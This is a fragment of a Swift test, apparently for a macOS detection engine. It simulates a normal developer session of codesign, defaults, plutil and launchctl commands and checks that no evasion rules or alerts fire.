        sim.exec("/usr/bin/codesign", ["-s", "-", "-f", "\(home)/proj/.build/debug/tool"], parent: zsh)
        sim.exec("/usr/bin/defaults", ["read", "com.apple.dock"], parent: zsh)
        sim.exec("/usr/bin/plutil", ["-lint", "\(home)/proj/Info.plist"], parent: zsh)
        sim.exec("/bin/launchctl", ["list"], parent: zsh)
        let ev = sim.ruleIDs.filter { $0.hasPrefix("EV") }
        check(ev.isEmpty && sim.maxConfidence < 60, "o6.fp: normal dev session raises no EV rules and no alert (\(sim.ruleIDs.sorted()), \(sim.maxConfidence))")
    }
}
